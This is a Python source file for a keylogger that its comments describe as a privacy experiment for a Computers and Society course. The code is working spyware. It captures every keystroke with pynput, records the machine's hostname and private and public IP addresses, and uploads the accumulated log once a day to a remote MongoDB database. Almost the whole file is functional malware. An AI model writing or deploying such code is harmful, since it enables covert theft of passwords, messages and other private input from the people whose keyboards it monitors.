# This is a keylogger built with Python.
# I used a python plugin called pynput-master in order
# to track user input.
# The input is logged to a text file.
# Moreover, I also log the user's host name and ip address
# when the script is run.
# The purpose was to test to see how easy it can be to create
# a piece of software that is potentially dangerous in invading
# privacy, since privacy is a big topic in Computers and Society

# library
from pynput.keyboard import Key, Listener
from pymongo import MongoClient
# vanilla
import logging
# import socket so I can get host name and ip address
import socket
import ipgetter
# import threading for a set interval
import threading
# for date and time
import datetime

# if no name for directory, it gets put into an empty string
 #make a log file
log_dir = ""
# variables to store IP address and host name if not available
host_name = "N/A"
host_ip = "N/A"
external_ip = "N/A"
# beginning time of script
start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# this is a function from the 
# sets file to log to with file name and path
# sets debugging level to logging
# formats messages and keylogs in ascending time order
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s:')

def writeFile(start_time, host_name, host_ip, external_ip):
    with open(log_dir + "key_log.txt", "a") as myfile:
            myfile.write("Start Time: " + start_time + "\n")
            myfile.write("Hostname: " + host_name + "\n")
            myfile.write("Private IP: " + host_ip + "\n")
            myfile.write("Public IP: " + external_ip + "\n")

# Function to display hostname and 
# IP address 
def get_Host_name_IP(): 
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name)
        external_ip = ipgetter.myip()
        print("Start Time:", start_time)
        print("Hostname:", host_name) 
        print("Private IP:", host_ip)
        print("Public IP:", external_ip) 
        writeFile(start_time, host_name, host_ip, external_ip)
    except: 
        print("Unable to get Hostname and IP") 
        writeFile(start_time, host_name, host_ip, external_ip)

# Driver code 
get_Host_name_IP() # Function call 

def set_interval(func, sec):
    def func_wrapper():
        set_interval(func, sec)
        func()
    t = threading.Timer(sec, func_wrapper)
    t.start()
    return t

uri = "MONGODB_URI"

client = MongoClient(uri,
        connectTimeoutMS=30000,
        socketTimeoutMS=None)

db = client.get_database()
logs = db.logs

def uploadFile():
    # get_Host_name_IP()
    f = open(log_dir + "key_log.txt")
    text = f.read()
    doc = {
    "file_name": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " Log.txt",
    "contents" : text }
    logs.insert_one(doc)

timer = set_interval(uploadFile, 86400)

# this is from the library
def on_press(key):
    logging.info(str(key))
    # logging can end if the escape key is pushed
    # if key == Key.esc:
        #return false

# the listener is listening to the keyboard on press as a listener
# this says the listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
